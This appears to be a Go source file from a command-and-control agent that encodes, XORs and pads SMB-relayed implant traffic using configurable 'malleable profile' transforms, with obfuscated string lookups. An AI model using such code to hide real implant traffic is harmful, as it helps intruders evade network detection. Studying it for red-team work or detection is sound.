// server/docker/payloads/TCP_Linux/transforms.go
// Agent-side transforms for TCP malleable profiles

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"strings"
)

// Transform template indices - must match server's common.go
const (
	idxTransBase64    = 760 // a
	idxTransBase64URL = 761 // b
	idxTransHex       = 762 // c
	idxTransGzip      = 763 // d
	idxTransNetBIOS   = 764 // e
	idxTransXOR       = 765 // f
	idxTransPrepend   = 766 // g
	idxTransAppend    = 767 // h
	idxTransRandPre   = 768 // i
	idxTransRandApp   = 769 // j
	idxCharsetNum     = 770 // 1
	idxCharsetAlpha   = 771 // 2
	idxCharsetAlnum   = 772 // 3
	idxCharsetHex     = 773 // 4
)

// getTransStr gets transform string from comms template
func getTransStr(idx int) string {
	return commsTpl(idx)
}

// SMBTransform represents a single transformation step
type SMBTransform struct {
	Type    string `json:"T"`
	Value   string `json:"V,omitempty"`
	Length  int    `json:"L,omitempty"`
	Charset string `json:"C,omitempty"`
}

// SMBDataBlock defines how data is transformed and placed
type SMBDataBlock struct {
	Output     string         `json:"o"`
	Transforms []SMBTransform `json:"t,omitempty"`
}

// SMBTransformResult contains the result and metadata
type SMBTransformResult struct {
	Data          []byte
	PrependLength int
	AppendLength  int
}

// getCharset returns the charset string for a given code
func getCharset(code string) string {
	switch code {
	case getTransStr(idxCharsetNum):
		return "0123456789"
	case getTransStr(idxCharsetAlpha):
		return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	case getTransStr(idxCharsetAlnum):
		return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	case getTransStr(idxCharsetHex):
		return "0123456789abcdef"
	}
	return ""
}

// =============================================================================
// FORWARD TRANSFORMS (SMB Agent -> Parent -> Server)
// =============================================================================

// applySMBTransforms applies a chain of transforms in order
func applySMBTransforms(data []byte, transforms []SMBTransform) (*SMBTransformResult, error) {
	result := &SMBTransformResult{Data: data}

	for _, t := range transforms {
		var err error
		switch t.Type {
		case getTransStr(idxTransBase64):
			result.Data = smbEncodeBase64(result.Data)
		case getTransStr(idxTransBase64URL):
			result.Data = smbEncodeBase64URL(result.Data)
		case getTransStr(idxTransHex):
			result.Data = smbEncodeHex(result.Data)
		case getTransStr(idxTransGzip):
			result.Data, err = smbEncodeGzip(result.Data)
		case getTransStr(idxTransNetBIOS):
			result.Data = smbEncodeNetBIOS(result.Data)
		case getTransStr(idxTransXOR):
			result.Data = smbApplyXOR(result.Data, []byte(t.Value))
		case getTransStr(idxTransPrepend):
			result.Data = smbPrependBytes(result.Data, []byte(t.Value))
		case getTransStr(idxTransAppend):
			result.Data = smbAppendBytes(result.Data, []byte(t.Value))
		case getTransStr(idxTransRandPre):
			padding := smbGenerateRandom(t.Length, t.Charset)
			result.Data = smbPrependBytes(result.Data, padding)
			result.PrependLength = t.Length
		case getTransStr(idxTransRandApp):
			padding := smbGenerateRandom(t.Length, t.Charset)
			result.Data = smbAppendBytes(result.Data, padding)
			result.AppendLength = t.Length
		default:
			return nil, fmt.Errorf(Err(E18))
		}
		if err != nil {
			return nil, err
		}
	}

	return result, nil
}

// =============================================================================
// REVERSE TRANSFORMS (Server -> Parent -> SMB Agent)
// =============================================================================

// reverseSMBTransforms reverses transforms to extract original data
func reverseSMBTransforms(data []byte, transforms []SMBTransform, prependLen, appendLen int) ([]byte, error) {
	result := data

	for i := len(transforms) - 1; i >= 0; i-- {
		t := transforms[i]
		var err error

		switch t.Type {
		case getTransStr(idxTransBase64):
			result, err = smbDecodeBase64(result)
		case getTransStr(idxTransBase64URL):
			result, err = smbDecodeBase64URL(result)
		case getTransStr(idxTransHex):
			result, err = smbDecodeHex(result)
		case getTransStr(idxTransGzip):
			result, err = smbDecodeGzip(result)
		case getTransStr(idxTransNetBIOS):
			result, err = smbDecodeNetBIOS(result)
		case getTransStr(idxTransXOR):
			result = smbApplyXOR(result, []byte(t.Value))
		case getTransStr(idxTransPrepend):
			result = smbStripPrepend(result, len(t.Value))
		case getTransStr(idxTransAppend):
			result = smbStripAppend(result, len(t.Value))
		case getTransStr(idxTransRandPre):
			length := prependLen
			if length == 0 {
				length = t.Length
			}
			result = smbStripPrepend(result, length)
		case getTransStr(idxTransRandApp):
			length := appendLen
			if length == 0 {
				length = t.Length
			}
			result = smbStripAppend(result, length)
		default:
			return nil, fmt.Errorf(Err(E18))
		}

		if err != nil {
			return nil, err
		}
	}

	return result, nil
}

// =============================================================================
// ENCODING FUNCTIONS
// =============================================================================

func smbEncodeBase64(data []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(data))
}

func smbDecodeBase64(data []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(data))
}

func smbEncodeBase64URL(data []byte) []byte {
	return []byte(base64.URLEncoding.EncodeToString(data))
}

func smbDecodeBase64URL(data []byte) ([]byte, error) {
	return base64.URLEncoding.DecodeString(string(data))
}

func smbEncodeHex(data []byte) []byte {
	return []byte(hex.EncodeToString(data))
}

func smbDecodeHex(data []byte) ([]byte, error) {
	return hex.DecodeString(string(data))
}

func smbEncodeGzip(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func smbDecodeGzip(data []byte) ([]byte, error) {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer r.Close()
	return io.ReadAll(r)
}

// NetBIOS encoding: each byte becomes two characters (nibble encoding)
func smbEncodeNetBIOS(data []byte) []byte {
	result := make([]byte, len(data)*2)
	for i, b := range data {
		result[i*2] = 'a' + (b >> 4)
		result[i*2+1] = 'a' + (b & 0x0f)
	}
	return result
}

func smbDecodeNetBIOS(data []byte) ([]byte, error) {
	if len(data)%2 != 0 {
		return nil, fmt.Errorf(Err(E18))
	}
	result := make([]byte, len(data)/2)
	for i := 0; i < len(data); i += 2 {
		high := data[i] - 'a'
		low := data[i+1] - 'a'
		if high > 15 || low > 15 {
			return nil, fmt.Errorf(Err(E18))
		}
		result[i/2] = (high << 4) | low
	}
	return result, nil
}

// =============================================================================
// XOR FUNCTION
// =============================================================================

func smbApplyXOR(data []byte, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return result
}

// =============================================================================
// PADDING FUNCTIONS
// =============================================================================

func smbPrependBytes(data []byte, prefix []byte) []byte {
	result := make([]byte, len(prefix)+len(data))
	copy(result, prefix)
	copy(result[len(prefix):], data)
	return result
}

func smbAppendBytes(data []byte, suffix []byte) []byte {
	result := make([]byte, len(data)+len(suffix))
	copy(result, data)
	copy(result[len(data):], suffix)
	return result
}

func smbStripPrepend(data []byte, length int) []byte {
	if length >= len(data) {
		return []byte{}
	}
	return data[length:]
}

func smbStripAppend(data []byte, length int) []byte {
	if length >= len(data) {
		return []byte{}
	}
	return data[:len(data)-length]
}

func smbGenerateRandom(length int, charset string) []byte {
	if length <= 0 {
		return []byte{}
	}

	chars := getCharset(charset)
	if chars == "" {
		// Default to alphanumeric
		chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	}

	result := make([]byte, length)
	randomBytes := make([]byte, length)
	rand.Read(randomBytes)

	for i := 0; i < length; i++ {
		result[i] = chars[int(randomBytes[i])%len(chars)]
	}
	return result
}

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

// parseSMBOutput parses output location like "header:X-ID" or "body"
func parseSMBOutput(output string) (locationType, name string) {
	parts := strings.SplitN(output, ":", 2)
	if len(parts) == 1 {
		return parts[0], ""
	}
	return parts[0], parts[1]
}

// parseSMBDataBlock parses a JSON-encoded SMBDataBlock
func parseSMBDataBlock(jsonData string) *SMBDataBlock {
	if jsonData == "" {
		return nil
	}

	var db SMBDataBlock
	if err := json.Unmarshal([]byte(jsonData), &db); err != nil {
		return nil
	}
	return &db
}
